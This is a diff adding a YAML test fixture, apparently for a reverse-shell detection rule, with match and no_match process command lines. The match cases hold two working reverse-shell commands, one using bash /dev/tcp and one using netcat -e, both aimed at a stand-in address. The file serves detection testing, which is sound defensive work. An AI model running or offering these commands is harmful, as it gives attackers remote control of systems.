@@ -1,0 +1,14 @@
+match:
+  - description: Bash /dev/tcp reverse shell
+    Image: '/usr/bin/bash'
+    CommandLine: 'bash -c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'
+  - description: Netcat executing a shell
+    Image: '/usr/bin/nc'
+    CommandLine: 'nc 203.0.113.10 4444 -e /bin/sh'
+no_match:
+  - description: Netcat port scan
+    Image: '/usr/bin/nc'
+    CommandLine: 'nc -zv 10.0.0.5 22'
+  - description: Normal curl call
+    Image: '/usr/bin/curl'
+    CommandLine: 'curl -s https://example.com/health'
